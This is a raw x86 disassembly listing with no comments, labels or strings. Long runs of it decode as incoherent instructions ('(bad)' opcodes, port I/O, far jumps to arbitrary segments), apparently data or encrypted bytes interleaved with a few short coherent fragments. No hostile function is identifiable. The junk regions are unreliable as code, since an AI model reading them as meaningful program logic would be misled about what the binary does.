  407a1f:	inc    edx
  407a20:	and    eax,0x786e7d20
  407a25:	sti    
  407a26:	aad    0xe4
  407a28:	aam    0x10
  407a2a:	push   es
  407a2b:	jg     0x407a1b
  407a2d:	jo     0x407a37
  407a2f:	push   ds
  407a30:	aaa    
  407a31:	test   DWORD PTR [ebp+0x7a8ad31e],ebx
  407a37:	bound  ecx,QWORD PTR [ebp-0x19abb66d]
  407a3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a3e:	fild   QWORD PTR [edx+0x3e5fd138]
  407a44:	rol    edx,0xf1
  407a47:	rcl    dh,1
  407a49:	cmp    eax,0xe14330ca
  407a4e:	mov    bl,0x1e
  407a50:	je     0x407a0b
  407a52:	mov    ds:0xb22c69f7,eax
  407a57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a58:	gs cld 
  407a5a:	xor    al,0x69
  407a5c:	out    dx,eax
  407a5d:	lahf   
  407a5e:	xor    BYTE PTR [ebp+ecx*2+0x1b],dl
  407a62:	addr16 jmp 0x6580:0xcc5b02ba
  407a6a:	dec    eax
  407a6b:	ficomp DWORD PTR [eax-0x1b]
  407a6e:	int3   
  407a6f:	popf   
  407a70:	cli    
  407a71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a72:	popa   
  407a73:	ficom  DWORD PTR [edx-0x11802f1]
  407a79:	sbb    DWORD PTR [esi+0x4a34dbda],edi
  407a7f:	xlat   BYTE PTR ds:[ebx]
  407a80:	jae    0x407a15
  407a82:	mov    ds:0xc924af66,eax
  407a87:	push   0x82fcfbc1
  407a8c:	lods   eax,DWORD PTR ds:[esi]
  407a8d:	pop    ds
  407a8e:	ds popf 
  407a90:	out    dx,al
  407a91:	sub    bl,cl
  407a93:	and    eax,0x88ac67be
  407a98:	dec    esp
  407a99:	mov    bl,0x94
  407a9b:	fwait
  407a9c:	mov    ch,0x15
  407a9e:	or     al,0x1b
  407aa0:	jmp    0x3f47:0x23aa7a3c
  407aa7:	inc    edx
  407aa8:	call   0x9674:0xd5a151ca
  407aaf:	pop    edx
  407ab0:	gs std 
  407ab2:	pop    eax
  407ab3:	inc    ecx
  407ab4:	lock aad 0x99
  407ab7:	mov    eax,0x1eb70f91
  407abc:	ret    0x4335
  407abf:	jno    0x407b17
  407ac1:	cdq    
  407ac2:	sar    DWORD PTR [eax-0x7544d817],cl
  407ac8:	cdq    
  407ac9:	stos   BYTE PTR es:[edi],al
  407aca:	add    al,BYTE PTR [esp+ecx*8-0x73]
  407ace:	mov    WORD PTR [ecx+0x62cf230b],gs
  407ad4:	mov    ch,0x4a
  407ad6:	push   ebp
  407ad7:	mov    al,ds:0xe0a3292f
  407adc:	stc    
  407add:	pop    eax
  407ade:	stc    
  407adf:	stos   BYTE PTR es:[edi],al
  407ae0:	push   edx
  407ae1:	push   cs
  407ae2:	push   cs
  407ae3:	icebp  
  407ae4:	int3   
  407ae5:	cmc    
  407ae6:	fs out 0x46,eax
  407ae9:	mov    DWORD PTR [edx+esi*8],0x2d842ab1
  407af0:	push   ds
  407af1:	stos   BYTE PTR es:[edi],al
  407af2:	add    ch,BYTE PTR [eax+0x7c]
  407af5:	ja     0x407a9b
  407af7:	adc    bh,dh
  407af9:	daa    
  407afa:	jno    0x407b5a
  407afc:	loop   0x407a9d
  407afe:	xor    eax,0xb67831de
  407b03:	fwait
  407b04:	sub    dh,al
  407b06:	adc    eax,0xcdd0cd56
  407b0b:	push   ss
  407b0c:	or     ah,cl
  407b0e:	pop    ebx
  407b0f:	mov    ebx,edx
  407b11:	ret    0x62c0
  407b14:	mov    edi,0x458bbf53
  407b19:	or     BYTE PTR [edi],cl
  407b1b:	mov    bh,0x4
  407b1d:	nop
  407b1e:	xor    eax,0x8a40
  407b23:	add    eax,edi
  407b25:	mov    edi,DWORD PTR [ebp-0x14]
  407b28:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407b2c:	mov    eax,DWORD PTR [ebp-0xc]
  407b2f:	inc    edx
  407b30:	cmp    edx,eax
  407b32:	jne    0x407679
  407b38:	pop    edi
  407b39:	pop    ebx
  407b3a:	jmp    0x407cbb
  407b3f:	fistp  QWORD PTR [edi]
  407b41:	aas    
  407b42:	or     bl,bh
  407b44:	or     ch,bl
  407b46:	jmp    0x407b0d
  407b48:	jle    0x407b96
  407b4a:	dec    ebx
  407b4b:	outs   dx,BYTE PTR ds:[esi]
  407b4c:	dec    edx
  407b4d:	inc    ecx
  407b4e:	mov    bh,BYTE PTR [ebp-0x3b]
  407b51:	jle    0x407bd1
  407b53:	sar    BYTE PTR [edi+0x7e],cl
  407b56:	jle    0x407afd
  407b58:	loop   0x407b99
  407b5a:	stos   BYTE PTR es:[edi],al
  407b5b:	fsubp  st(4),st
  407b5d:	test   al,0xd7
  407b5f:	push   ebx
  407b60:	sbb    bh,dl
  407b62:	adc    DWORD PTR [edx+0x11cb7b37],0xdac30fbc
  407b6c:	clc    
  407b6d:	mov    dh,0x8c
  407b6f:	int    0x14
  407b71:	pop    es
  407b72:	inc    esi
  407b73:	or     cl,BYTE PTR [eax+0x73]
  407b76:	pop    edi
  407b77:	adc    al,0x99
  407b79:	xchg   DWORD PTR [ecx-0x428dd60e],edx
  407b7f:	and    DWORD PTR [edx],esp
  407b81:	cmp    BYTE PTR [ebx-0x16825915],0x25
  407b88:	pop    esp
  407b89:	jecxz  0x407bc8
  407b8b:	dec    eax
  407b8c:	repz cmp ecx,0x2f4c8208
  407b93:	xor    al,0x32
  407b95:	daa    
  407b96:	mov    al,ds:0x78cc78f9
  407b9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b9c:	nop
  407b9d:	xchg   DWORD PTR [eax+0x27],ebx
  407ba0:	cli    
  407ba1:	jns    0x407b4c
  407ba3:	fldenv [ebx+0x8]
  407ba6:	or     BYTE PTR [ecx-0x29c821e5],bl
  407bac:	lds    eax,FWORD PTR [eax+ebx*2-0x739c0f06]
  407bb3:	or     DWORD PTR [edi+0x75],esi
  407bb6:	mov    edx,0xfdd16fff
  407bbb:	in     al,0xa0
  407bbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bbe:	in     al,dx
  407bbf:	arpl   WORD PTR [ecx-0x23],dx
  407bc2:	jge    0x407c08
  407bc4:	out    dx,al
  407bc5:	sbb    bl,BYTE PTR [ecx+0x73]
  407bc8:	ja     0x407c27
  407bca:	sub    eax,0x415a0f30
  407bcf:	lods   al,BYTE PTR ds:[esi]
  407bd0:	fidivr WORD PTR [edi+0x6fd9fe]
  407bd6:	xor    dh,BYTE PTR [ecx+0x21a00ca]
  407bdc:	fwait
  407bdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bde:	xchg   ebx,eax
  407bdf:	loope  0x407c3e
  407be1:	xor    edx,DWORD PTR [ebx+0x5a]
  407be4:	xlat   BYTE PTR ds:[ebx]
  407be5:	mov    al,es:0xde8dc811
  407beb:	stos   DWORD PTR es:[edi],eax
  407bec:	arpl   WORD PTR [ebp-0x55],cx
  407bef:	pop    esp
  407bf0:	or     DWORD PTR [ebp+0x48],edi
  407bf3:	loopne 0x407bd3
  407bf5:	shl    ebp,0x19
  407bf8:	retf   0x8c06
  407bfb:	mov    al,ds:0x8b581874
  407c00:	aad    0x58
  407c02:	jmp    0x407c42
  407c04:	popa   
  407c05:	pop    esi
  407c06:	inc    edi
  407c07:	pop    ds
  407c08:	push   eax
  407c09:	loope  0x407c60
  407c0b:	call   0xdf7b:0xbe2ad179
  407c12:	sar    DWORD PTR [ecx-0xc],1
  407c15:	adc    eax,0x9ade9aa5
  407c1a:	out    0x59,al
  407c1c:	out    dx,al
  407c1d:	shl    DWORD PTR [eax+ebx*1+0x4e19f303],cl
  407c24:	aas    
  407c25:	jne    0x407c57
  407c27:	add    eax,0x50f2d2b9
  407c2c:	out    0x3a,al
  407c2e:	and    BYTE PTR [esi+ebx*4],ch
  407c31:	xchg   esi,eax
  407c32:	adc    esi,eax
  407c34:	imul   ebp,edi,0x94ddb917
  407c3a:	push   eax
  407c3b:	(bad)  
  407c3c:	jmp    0xf73efc75
  407c41:	sub    BYTE PTR [ebx+0x22],bl
  407c44:	stc    
  407c45:	jmp    0x1e1c:0x8cc7c00f
  407c4c:	shl    BYTE PTR ds:0x66cbabea,0xe3
  407c53:	mov    edi,0x7450983d
  407c58:	lahf   
  407c59:	and    al,0xab
  407c5b:	xor    BYTE PTR [eax-0x15],ch
  407c5e:	test   eax,0x5c43de55
  407c63:	push   eax
  407c64:	push   ecx
  407c65:	xchg   ebx,eax
  407c66:	mov    DWORD PTR ds:0x16c61ea7,esi
  407c6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c6d:	mov    al,0x6
  407c6f:	dec    eax
  407c70:	loop   0x407c6d
  407c72:	jo     0x407c8e
  407c74:	retf   0x115f
  407c77:	inc    edi
  407c78:	stos   DWORD PTR es:[edi],eax
  407c79:	mov    edi,0x374b784a
  407c7e:	fisub  DWORD PTR [ebp+0xd930362]
  407c84:	inc    BYTE PTR [ebx-0x17245447]
  407c8a:	sbb    edi,DWORD PTR [ebx+0x69a0f42a]
  407c90:	push   0x2edc59a5
  407c95:	pusha  
  407c96:	dec    edx
  407c97:	loopne 0x407c66
  407c99:	adc    ebp,esi
  407c9b:	ins    DWORD PTR es:[edi],dx
  407c9c:	mov    ah,0xc1
  407c9e:	dec    ecx
  407c9f:	pop    edi
  407ca0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ca1:	xor    esi,DWORD PTR [ebp+0x296f97a3]
  407ca7:	cmp    eax,0x89bb97a4
  407cac:	xchg   ecx,eax
  407cad:	(bad)  
  407cae:	imul   BYTE PTR [edi-0x1e2e61ff]
  407cb4:	xchg   edi,eax
  407cb5:	(bad)
  407cba:	xlat   BYTE PTR ds:[ebx]
  407cbb:	mov    eax,DWORD PTR [ebp-0x8]
  407cbe:	mov    edx,DWORD PTR [ebp+0x10]
  407cc1:	xor    eax,ecx
  407cc3:	add    eax,esi
  407cc5:	mov    DWORD PTR [edx],eax
  407cc7:	mov    eax,DWORD PTR [ebp-0x8]
  407cca:	xor    eax,ecx
  407ccc:	add    eax,esi
  407cce:	jmp    0x407e4f
  407cd3:	mov    bh,0xb6
  407cd5:	(bad)  
  407cd6:	ror    DWORD PTR [edi+0x86a7bfb],cl
  407cdc:	dec    ebx
  407cdd:	ror    DWORD PTR [edx],cl
  407cdf:	out    dx,eax
  407ce0:	jp     0x407d10
  407ce2:	add    dl,cl
  407ce4:	(bad)  
  407ce5:	jle    0x407d65
  407ce7:	sar    BYTE PTR [edi+0x7e],cl
  407cea:	jle    0x407d41
  407cec:	adc    DWORD PTR [edi+ecx*4],0x3f2ba967
  407cf3:	(bad)  [ebx+0x23]
  407cf6:	xor    BYTE PTR [esi-0x2afe3a68],ah
  407cfc:	dec    eax
  407cfd:	adc    eax,0x8a6a366b
  407d02:	inc    esi
  407d03:	out    dx,eax
  407d04:	inc    edx
  407d05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d06:	cmp    al,0x7f
  407d08:	cmp    BYTE PTR [edi+0x1d],ah
  407d0b:	mov    eax,0x4030d387
  407d10:	arpl   WORD PTR [edx],cx
  407d12:	push   ds
  407d13:	jne    0x407d66
  407d15:	cmp    BYTE PTR [esi-0x1],bh
  407d18:	xchg   ecx,eax
  407d19:	in     al,dx
  407d1a:	(bad)  
  407d1b:	aad    0x4b
  407d1d:	jecxz  0x407cc0
  407d1f:	hlt    
  407d20:	test   DWORD PTR [ecx-0x46],0xb7b72a7b
  407d27:	sub    esp,DWORD PTR ds:0xe046bd04
  407d2d:	aas    
  407d2e:	out    dx,eax
  407d2f:	push   cs
  407d30:	pop    esi
  407d31:	inc    esi
  407d32:	push   ebx
  407d33:	sbb    BYTE PTR [esi],dl
  407d35:	mov    ds:0xeee43932,eax
  407d3a:	call   0x44e9ae80
  407d3f:	addr16 cdq 
  407d41:	stc    
  407d42:	icebp  
  407d43:	(bad)  
  407d45:	jl     0x407d85
  407d47:	mov    eax,0x7363138b
  407d4c:	in     eax,0xe9
  407d4e:	sbb    eax,0xac12c68a
  407d53:	mov    ds:0x21e31982,eax
  407d58:	rcr    BYTE PTR [edx+ebx*8+0x659b67e6],0x47
  407d60:	dec    esp
  407d61:	and    al,0x1e
  407d63:	out    dx,al
  407d64:	inc    DWORD PTR [ebp+0x4870fae4]
  407d6a:	call   0x6b68:0x97faaf44
  407d71:	stos   DWORD PTR es:[edi],eax
  407d72:	xchg   ecx,eax
  407d73:	rcl    DWORD PTR [ebp-0x8],0x16
  407d77:	or     dl,BYTE PTR [esi-0x4b]
  407d7a:	mov    eax,0xc1250355
  407d7f:	jg     0x407d2a
  407d81:	or     ch,BYTE PTR [esi-0xb3ecbe1]
  407d87:	mov    cl,0x7
  407d89:	je     0x407d16
  407d8b:	pop    ecx
  407d8c:	mov    eax,ds:0x5e2f90e6
  407d91:	fist   WORD PTR [esi+0x35e0625b]
  407d97:	cmp    DWORD PTR [eax-0x11607b3b],esp
  407d9d:	in     eax,0x30
  407d9f:	jl     0x407d67
  407da1:	and    BYTE PTR [edx+0x5aac1502],0x16
  407da8:	ja     0x407e1a
  407daa:	mov    bl,0x4a
  407dac:	mov    eax,0x395a4bf2
  407db1:	int3   
  407db2:	push   cs
  407db3:	mov    bl,0xa9
  407db5:	and    BYTE PTR [eax],cl
  407db7:	xchg   edx,eax
  407db8:	imul   edx,DWORD PTR [ecx-0x495b6a17],0x67
  407dbf:	mov    ds:0x7f30ecfb,eax
  407dc4:	cmp    dl,0xc7
  407dc7:	mov    ah,0x4f
  407dc9:	sbb    eax,0x434ec92d
  407dce:	fs (bad) 
  407dd1:	mov    esi,0x899078c4
  407dd6:	neg    BYTE PTR [esi-0x50f2a6c0]
  407ddc:	jmp    0xd32453f
  407de1:	inc    ebx
  407de2:	addr16 jnp 0x407e44
  407de5:	in     al,0x8
  407de7:	pop    esp
  407de8:	xchg   edi,eax
  407de9:	add    cl,BYTE PTR [eax+0x52d0f865]
  407def:	jecxz  0x407e51
  407df1:	call   0x9309ea67
  407df6:	lods   eax,DWORD PTR ds:[esi]
  407df7:	xor    al,0x4b
  407df9:	fisttp DWORD PTR [esi+0x41]
  407dfc:	(bad)  
  407dfd:	xor    DWORD PTR [ebp+0x4a],edx
  407e00:	mov    DWORD PTR [eax-0x64],edx
  407e03:	stos   DWORD PTR es:[edi],eax
  407e04:	maxps  xmm0,xmm2
  407e07:	arpl   WORD PTR [edx-0xa],dx
  407e0a:	imul   ebx,DWORD PTR [ecx],0x78
  407e0d:	sub    ebp,DWORD PTR [eax]
  407e0f:	mov    BYTE PTR [eax-0x4c991508],ch
  407e15:	fdivrp st(4),st
  407e17:	in     eax,0xc1
  407e19:	repnz push ecx
  407e1b:	mov    al,0xa
  407e1d:	pop    eax
  407e1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e1f:	mov    DWORD PTR [edx-0x6331fc15],ebp
  407e25:	in     al,dx
  407e26:	or     esi,ebp
  407e28:	pushf  
  407e29:	mov    esi,0xe031b8a3
  407e2e:	jl     0x407e57
  407e30:	push   esi
  407e31:	sub    eax,DWORD PTR [edx]
  407e33:	mov    esi,0x1068cc95
  407e38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e39:	mov    ds:0x23d43d1a,eax
  407e3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e3f:	xor    al,0xfc
  407e41:	mov    edi,DWORD PTR [eax-0x1b]
  407e44:	inc    ecx
  407e45:	xor    BYTE PTR [edx+0x64f7d6a4],bl
  407e4b:	adc    DWORD PTR [ebx-0x1c],esp
  407e4e:	inc    esi
  407e4f:	mov    DWORD PTR [ebp+0x8],eax
  407e52:	mov    eax,DWORD PTR [ebp+0x8]
  407e55:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  407e59:	mov    dl,BYTE PTR [ebp-0x1]
  407e5c:	cmp    al,dl
  407e5e:	je     0x4081a3
  407e64:	mov    eax,DWORD PTR [ebp+0x8]
  407e67:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  407e6b:	mov    edx,DWORD PTR [ebp+0xc]
  407e6e:	cmp    al,BYTE PTR [edx]
  407e70:	jne    0x40834a
  407e76:	mov    eax,DWORD PTR [ebp-0x8]
  407e79:	mov    edx,DWORD PTR [ebp+0xc]
  407e7c:	movsx  edx,BYTE PTR [edx]
  407e7f:	xor    eax,ecx
  407e81:	add    eax,esi
  407e83:	cmp    edx,eax
  407e85:	je     0x40833e
  407e8b:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  407e92:	lea    eax,[ebp-0x18]
  407e95:	jmp    0x408016
  407e9a:	xchg   BYTE PTR [eax],cl
  407e9c:	mov    al,ds:0xb8a6a08e
  407ea1:	or     BYTE PTR [edx],ah
  407ea3:	mov    bl,cl
  407ea5:	mov    dl,0x59
  407ea7:	leave  
  407ea8:	add    BYTE PTR [edx-0x4b],bh
  407eab:	fdivr  DWORD PTR [esi+0x7e]
  407eae:	sar    BYTE PTR [edi+0x7e],cl
  407eb1:	jle    0x407e3a
  407eb3:	out    dx,eax
  407eb4:	jne    0x407ed8
  407eb6:	xchg   esi,eax
  407eb7:	xor    ebp,DWORD PTR [ecx+0x78]
  407eba:	pop    ds
  407ebb:	xchg   ebp,eax
  407ebc:	fdiv   st(0),st
  407ebe:	pop    esi
  407ebf:	inc    edi
  407ec0:	scas   eax,DWORD PTR es:[edi]
  407ec1:	and    DWORD PTR [esi+edi*4+0x2fc377e2],eax
  407ec8:	lahf   
  407ec9:	(bad)  
  407eca:	push   eax
  407ecb:	inc    esi
  407ecc:	push   edi
  407ecd:	mov    eax,0x6ea11b42
  407ed2:	jne    0x407f47
  407ed4:	adc    esi,edx
  407ed6:	enter  0xb8b3,0xe0
  407eda:	daa    
  407edb:	cmp    ebx,esi
  407edd:	fcomp  st(6)
  407edf:	mov    cl,0x7f
  407ee1:	xchg   BYTE PTR [ecx],ah
  407ee3:	pop    eax
  407ee4:	repnz aad 0x2b
  407ee7:	cmp    al,0xc0
  407ee9:	out    0x55,al
  407eeb:	push   eax
  407eec:	and    BYTE PTR [eax],bh
  407eee:	lahf   
  407eef:	inc    ebp
  407ef0:	test   eax,0x5defa4d0
  407ef5:	push   ss
  407ef6:	test   al,0x57
  407ef8:	sbb    cl,ch
  407efa:	and    eax,0x6c620e35
  407eff:	push   edi
  407f00:	inc    esi
  407f01:	pop    edx
  407f02:	adc    DWORD PTR [eax],ebx
  407f04:	not    DWORD PTR [ebp+0xb6f57de]
  407f0a:	dec    eax
  407f0b:	jmp    0x407f41
  407f0d:	stc    
  407f0e:	dec    esp
  407f0f:	mov    bl,0x97
  407f11:	scas   eax,DWORD PTR es:[edi]
  407f12:	cld    
  407f13:	ins    DWORD PTR es:[edi],dx
  407f14:	cs add al,0x5
  407f17:	loopne 0x407f64
  407f19:	daa    
  407f1a:	and    eax,0x83bb1288
  407f1f:	cmp    eax,0x36698276
  407f24:	and    ebx,DWORD PTR [esi-0xfa098db]
  407f2a:	pop    ecx
  407f2b:	outs   dx,BYTE PTR ds:[esi]
  407f2c:	mov    BYTE PTR [eax-0x32],cl
  407f2f:	push   cs
  407f30:	cmp    dl,dl
  407f32:	scas   eax,DWORD PTR es:[edi]
  407f33:	xor    eax,0xb70507a2
  407f38:	aaa    
  407f39:	div    DWORD PTR [esi+ecx*8]
  407f3c:	adc    DWORD PTR [eax],0xffffffee
  407f3f:	ss sub al,0xd1
  407f42:	aaa    
  407f43:	sahf   
  407f44:	lods   eax,DWORD PTR ds:[esi]
  407f45:	adc    BYTE PTR [eax-0x487dce8],bh
  407f4b:	fdivr  st,st(2)
  407f4d:	shl    BYTE PTR [ecx+0x72919dfe],cl
  407f53:	nop
  407f54:	xor    BYTE PTR [ecx+edi*2-0x1844029a],0x74
  407f5c:	pop    ebx
  407f5d:	sub    eax,0x52897216
  407f62:	and    eax,0x50d17bce
  407f67:	or     al,0xd7
  407f69:	stos   BYTE PTR es:[edi],al
  407f6a:	and    BYTE PTR [eax],ah
  407f6c:	pusha  
  407f6d:	inc    edx
  407f6e:	(bad)  
  407f6f:	cmp    DWORD PTR [eax],edx
  407f71:	(bad)  
  407f74:	push   esp
  407f75:	xor    al,0x61
  407f77:	jb     0x407f3f
  407f79:	cmp    eax,0xdca80e4b
  407f7e:	outs   dx,BYTE PTR ds:[esi]
  407f7f:	dec    esp
  407f80:	in     eax,dx
  407f81:	sub    eax,DWORD PTR [ebp+0x61ca589e]
  407f87:	and    esp,DWORD PTR [ebx-0x2666753]
  407f8d:	push   ds
  407f8e:	jb     0x407f5c
  407f90:	jb     0x407fa9
  407f92:	ret    
  407f93:	lahf   
  407f94:	sar    DWORD PTR [edx+0x36],cl
  407f97:	and    eax,0xec67f8bd
  407f9c:	loope  0x407f82
  407f9e:	xchg   DWORD PTR [edx],esi
  407fa0:	cmp    al,0x94
  407fa2:	adc    eax,0x66582178
  407fa7:	push   cs
  407fa8:	xchg   BYTE PTR [ecx-0x785faf4b],bh
  407fae:	sbb    al,0xce
  407fb0:	data16 mov al,ds:0x3aa5e5a4
  407fb6:	iret   
  407fb7:	fsub   QWORD PTR [ebx+0x2c]
  407fba:	sub    BYTE PTR [edi-0xd161580],al
  407fc0:	jmp    0x408022
  407fc2:	gs dec ebp
  407fc4:	aaa    
  407fc5:	test   al,0xd0
  407fc7:	data16 sbb BYTE PTR [eax],0x96
  407fcb:	bound  ecx,QWORD PTR [esi-0x13]
  407fce:	mov    WORD PTR gs:[ebx-0x3e],ss
  407fd2:	popa   
  407fd3:	shl    BYTE PTR [ebp+0x627d0957],1
  407fd9:	adc    eax,DWORD PTR [ebx+0x77ba9c25]
  407fdf:	test   eax,0x1e833ab8
  407fe4:	stos   BYTE PTR es:[edi],al
  407fe5:	out    0x1d,eax
  407fe7:	int3   
  407fe8:	sbb    DWORD PTR [edx+0xa],ebp
  407feb:	(bad)  
  407fec:	leave  
  407fed:	fisttp DWORD PTR [ebx-0x4e863776]
  407ff3:	cmp    DWORD PTR [esi],esi
  407ff5:	aad    0x51
  407ff7:	and    BYTE PTR [eax+0x7649d5e8],bl
  407ffd:	or     eax,0xcbf1fe9b
  408002:	retf   0xd6a7
  408005:	adc    DWORD PTR [edi],esi
  408007:	pusha  
  408008:	mov    ebx,0x5c6dbfa9
  40800d:	and    edi,ebx
  40800f:	cdq    
  408010:	cmp    ebx,DWORD PTR [ecx-0x700d76e5]
  408016:	mov    DWORD PTR [ebp-0x14],eax
  408019:	mov    eax,DWORD PTR [ebp-0x14]
  40801c:	add    DWORD PTR [eax],0x705fa8f
  408022:	jmp    0x4081a3
  408027:	test   al,0x70
  408029:	cmp    ch,BYTE PTR [ecx-0x46]
  40802c:	jge    0x4080ab
  40802e:	xor    DWORD PTR [edx-0x4f],eax
  408031:	imul   esi,DWORD PTR [edx-0x58099e97],0x7e7eda29
  40803b:	sar    BYTE PTR [edi+0x7e],cl
  40803e:	jle    0x408092
  408040:	sub    DWORD PTR [edx],ebp
  408042:	sub    al,0xa9
  408044:	icebp  
  408045:	mov    bl,ch
  408047:	or     bh,dl
  408049:	mov    eax,0x159ba5f2
  40804e:	(bad)  
  40804f:	mov    esi,0x6f328847
  408054:	scas   eax,DWORD PTR es:[edi]
  408055:	dec    ecx
  408056:	in     al,dx
  408057:	sub    ebx,DWORD PTR [ecx]
  408059:	ret    0x222a
  40805c:	dec    ebp
  40805d:	fldenv [eax+0x1d0ea1a8]
  408063:	mov    ebp,0x5868138d
  408068:	xchg   BYTE PTR ds:0x576a3d58,ch
  40806e:	sub    BYTE PTR cs:[eax+0x3e],ah
  408072:	test   eax,0xbcfa08c4
  408077:	pop    esi
  408078:	sbb    ecx,DWORD PTR [edx+ebx*1+0x78]
  40807c:	cmp    al,0xa2
  40807e:	call   0xb33052fd
  408083:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408084:	push   cs
  408085:	push   ss
  408086:	(bad)  
  408087:	repnz mov cl,0x34
  40808a:	push   edx
  40808b:	pop    ebp
  40808c:	fst    DWORD PTR [ecx]
  40808e:	test   eax,0x2c08ccec
  408093:	push   edi
  408094:	lds    ebp,FWORD PTR [esi+0x5316c4ec]
  40809a:	add    al,0xb8
  40809c:	jnp    0x408026
  40809e:	int    0xba
  4080a0:	jno    0x408035
  4080a2:	pop    ecx
  4080a3:	adc    al,bl
  4080a5:	(bad)  
  4080a6:	(bad)  
  4080a7:	ds ror cl,0x7
  4080ab:	mov    edx,0xe1552b75
  4080b0:	loopne 0x4080e5
  4080b2:	mov    edi,0x5ef270fe
  4080b7:	mov    esi,0xdb24310
  4080bc:	(bad)  
  4080bd:	sbb    esi,ecx
  4080bf:	push   ebp
  4080c0:	aaa    
  4080c1:	ja     0x408107
  4080c3:	adc    dl,BYTE PTR [eax+0x4a]
  4080c6:	pop    ebp
  4080c7:	jb     0x408055
  4080c9:	leave  
  4080ca:	retf   
  4080cb:	mov    ch,0x3c
  4080ce:	jge    0x40806f
  4080d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080d1:	inc    edx
  4080d2:	call   0x454:0x87085bba
  4080d9:	clc    
  4080da:	inc    ebp
  4080dc:	push   es
  4080dd:	xchg   esi,eax
  4080de:	test   eax,0x7f7ce0dc
  4080e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080e4:	gs mov dh,0xa2
  4080e7:	loopne 0x408142
  4080e9:	adc    DWORD PTR [esi+0x27],edx
  4080ec:	rcr    DWORD PTR [edi+0x64f587df],1
  4080f2:	jns    0x4080f2
  4080f4:	jne    0x40807a
  4080f6:	jg     0x4080a2
  4080f8:	ja     0x408160
  4080fa:	pop    eax
  4080fb:	add    BYTE PTR [ecx],ah
  4080fd:	pop    ds
  4080fe:	call   0x5b46dcee
  408103:	dec    edx
  408104:	stos   BYTE PTR es:[edi],al
  408105:	xchg   ecx,eax
  408106:	mov    dh,0xc
  408108:	jb     0x408168
  40810a:	out    0x29,eax
  40810c:	clc    
  40810d:	out    0xf7,eax
  40810f:	mov    ds:0x8afd4ffe,eax
  408114:	and    esi,ebx
  408116:	xor    dh,BYTE PTR [ecx]
  408118:	enter  0xc016,0x4a
  40811c:	cdq    
  40811d:	jl     0x4080de
  40811f:	cmp    al,0xec
  408121:	ss or  dh,al
  408124:	mov    bl,dl
  408126:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408127:	shl    DWORD PTR cs:[edx+0x176f3c76],0x81
  40812f:	ret    0x5783
  408132:	push   edx
  408133:	mov    bh,0xe8
  408135:	xchg   edx,eax
  408136:	adc    DWORD PTR [ebp+0x7a],esi
  408139:	cmc    
  40813a:	mov    ds:0xc5ad00a4,al
  40813f:	sbb    al,0x69
  408141:	jne    0x408186
  408143:	mov    ds:0xfe8c9ca6,eax
  408148:	test   BYTE PTR [ebx],bh
  40814a:	int3   
  40814b:	stos   DWORD PTR es:[edi],eax
  40814c:	rcl    DWORD PTR [edx+0x7df01b37],0xbc
  408153:	das    
  408154:	mov    esp,0x3c9796ff
  408159:	cld    
  40815a:	pop    es
  40815b:	sub    eax,DWORD PTR [ebx-0x3b44f905]
  408161:	in     al,0xa0
  408163:	cmp    bh,dl
  408165:	mov    ds:0xd0645cac,eax
  40816a:	xor    eax,0x879bb65b
  40816f:	dec    esi
  408170:	cmp    ebp,DWORD PTR [esi]
  408172:	cdq    
  408173:	mov    bl,0x3b
  408175:	mov    edi,0xf0860d70
  40817a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40817b:	lods   eax,DWORD PTR ds:[esi]
  40817c:	sub    eax,0xc1e1fb72
  408181:	adc    BYTE PTR ds:0xe72cbeb1,ah
  408187:	pop    eax
  408188:	or     DWORD PTR [esi+0x34b9f43],edx
  40818e:	lock imul edi,DWORD PTR cs:[esi+0x76f07659],0x48140eeb
  40819a:	push   edi
  40819b:	ins    DWORD PTR es:[edi],dx
  40819c:	push   esi
  40819d:	cld    
  40819e:	hlt    
  40819f:	cmp    ch,ah
  4081a1:	or     eax,DWORD PTR [edi-0x75]
  4081a4:	inc    ebp
  4081a5:	lock mov edx,DWORD PTR [ebp+0x8]
  4081a9:	xor    eax,ecx
  4081ab:	jmp    0x40832c
  4081b0:	dec    edx
  4081b1:	sbb    ch,0x7
  4081b4:	fstp   QWORD PTR [ebx+0x4c]
  4081b7:	inc    ebp
  4081b8:	inc    eax
  4081b9:	jmp    DWORD PTR [ebp-0x1eb36971]
  4081bf:	add    cl,BYTE PTR [ebp-0x2d818125]
  4081c5:	jg     0x408245
  4081c7:	jle    0x408161
  4081c9:	aad    0xef
  4081cb:	pop    esi
  4081cc:	xor    edi,edx
  4081ce:	adc    dh,BYTE PTR [edx-0x251b671d]
  4081d4:	push   edx
  4081d5:	jecxz  0x4081a4
  4081d7:	and    DWORD PTR [eax],edi
  4081d9:	iret   
  4081da:	mov    eax,ds:0x46b978bf
  4081df:	mov    BYTE PTR [edx+0x40],0x48
  4081e3:	push   ebx
  4081e4:	xor    BYTE PTR [ebp-0x54766459],dh
  4081ea:	shl    BYTE PTR [ecx+0x70],cl
  4081ed:	mov    ds:0xf37d43f0,eax
  4081f2:	shl    DWORD PTR [ebx-0x35eea3fd],cl
  4081f8:	aas    
  4081f9:	loope  0x408271
  4081fb:	bound  esi,QWORD PTR [ebx]
  4081fd:	cmp    ch,0x25
  408200:	push   ebp
  408201:	das    
  408202:	dec    ebp
  408203:	fisub  DWORD PTR [ecx+0x6736013f]
  408209:	stos   DWORD PTR es:[edi],eax
  40820a:	xchg   BYTE PTR [ecx-0x5a],ch
